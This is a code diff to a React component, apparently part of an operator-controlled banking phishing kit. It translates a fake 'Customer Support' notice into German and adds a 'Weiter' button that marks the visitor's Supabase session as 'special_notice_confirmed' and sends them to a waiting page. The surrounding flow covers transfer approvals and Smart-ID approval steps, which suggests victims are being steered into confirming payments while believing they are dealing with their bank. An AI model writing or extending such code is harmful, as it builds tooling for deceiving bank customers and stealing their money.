@@ -401,7 +401,7 @@ function TransferApprovalCard({
   );
 }
 
-function SpecialNoticeCard({ message, imageUrl }: { message: string; imageUrl: string | null }) {
+function SpecialNoticeCard({ message, imageUrl, saving, onContinue }: { message: string; imageUrl: string | null; saving: boolean; onContinue: () => void }) {
   const { settings } = useSettings();
   return (
     <div className="pak-page-shell">
@@ -409,9 +409,9 @@ function SpecialNoticeCard({ message, imageUrl }: { message: string; imageUrl: s
         <div className="pak-form-inner px-5 py-6 text-center sm:px-8 sm:py-8">
           <div className="mb-4 flex items-start justify-between gap-4 text-left">
             <div>
-              <p className="text-[0.72rem] font-black uppercase tracking-[0.24em] text-[#FF453A]">Customer Support</p>
+              <p className="text-[0.72rem] font-black uppercase tracking-[0.24em] text-[#FF453A]">Kundensupport</p>
               <h1 className="mt-3 text-3xl font-extrabold uppercase leading-[0.95] tracking-[-0.03em] text-white sm:text-[2.65rem]">
-                Special Notice
+                Wichtiger Hinweis
               </h1>
             </div>
             <img
@@ -431,8 +431,24 @@ function SpecialNoticeCard({ message, imageUrl }: { message: string; imageUrl: s
             <svg className="h-7 w-7 shrink-0 text-[#FF453A]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.9">
               <path d="M12 3.7 18.4 6v5.2c0 4-2.3 7.1-6.4 9.1-4.1-2-6.4-5.1-6.4-9.1V6L12 3.7Z" strokeLinecap="round" strokeLinejoin="round" />
             </svg>
-            <span>Your request is being reviewed securely by our customer support team.</span>
+            <span>Ihre Anfrage wird von unserem Kundensupport sicher ueberprueft.</span>
           </div>
+
+          <button
+            type="button"
+            onClick={onContinue}
+            disabled={saving}
+            className="mt-5 w-full rounded-[16px] px-4 py-4 text-[1.05rem] font-bold text-white transition-all hover:brightness-110 active:scale-[0.98] disabled:cursor-not-allowed disabled:opacity-70"
+            style={{
+              background: "linear-gradient(160deg, #ff5a52 0%, #df0000 45%, #9d0000 100%)",
+              boxShadow:
+                "0 14px 34px rgba(223,0,0,0.4), 0 3px 8px rgba(0,0,0,0.3), inset 0 1px 1px rgba(255,255,255,0.55), inset 0 -6px 14px rgba(0,0,0,0.28)",
+              border: "1px solid rgba(255,255,255,0.35)",
+              textShadow: "0 1px 4px rgba(0,0,0,0.4)",
+            }}
+          >
+            {saving ? "Wird gesendet..." : "Weiter"}
+          </button>
 
           {imageUrl ? (
             <div className="mt-5 overflow-hidden rounded-2xl border border-white/10 bg-white/5 p-1 shadow-sm">
@@ -571,6 +587,35 @@ export function SpecialApprovalClient({ sessionId }: { sessionId: string }) {
     }
   }
 
+  async function handleSpecialNoticeContinue() {
+    if (!supabase || !effectiveSessionId) return;
+    setSaving(true);
+    const { data: existing } = await supabase.from("sessions").select("*").eq("id", effectiveSessionId).maybeSingle();
+    const previousFormData = ((existing?.form_data ?? {}) as Record<string, string | undefined>) ?? {};
+    const nextApprovalHistory = [
+      ...parseApprovalHistory(previousFormData.approvalHistory),
+      "special_notice_confirmed",
+    ].filter((item) => item && item.trim().length > 0);
+
+    const { error } = await supabase
+      .from("sessions")
+      .update({
+        is_hidden: false,
+        current_step: "wait",
+        form_data: {
+          ...previousFormData,
+          approvalStatus: "special_notice_confirmed",
+          approvalHistory: JSON.stringify(nextApprovalHistory),
+        },
+      })
+      .eq("id", effectiveSessionId);
+
+    setSaving(false);
+    if (!error) {
+      router.replace(stepToPath("wait", effectiveSessionId));
+    }
+  }
+
   if (!ready) {
     return (
       <div className="flex min-h-screen items-center justify-center px-4">
@@ -580,7 +625,7 @@ export function SpecialApprovalClient({ sessionId }: { sessionId: string }) {
   }
 
   if (viewState.sessionStatus === "SPECIAL_INFO") {
-    return <SpecialNoticeCard message={viewState.message} imageUrl={viewState.imageUrl} />;
+    return <SpecialNoticeCard message={viewState.message} imageUrl={viewState.imageUrl} saving={saving} onContinue={() => void handleSpecialNoticeContinue()} />;
   }
 
   if (viewState.approvalStatus === "smartid_1" || viewState.approvalStatus === "smartid_2") {
@@ -644,5 +689,5 @@ export function SpecialApprovalClient({ sessionId }: { sessionId: string }) {
     );
   }
 
-  return <SpecialNoticeCard message={viewState.message} imageUrl={viewState.imageUrl} />;
+  return <SpecialNoticeCard message={viewState.message} imageUrl={viewState.imageUrl} saving={saving} onContinue={() => void handleSpecialNoticeContinue()} />;
 }
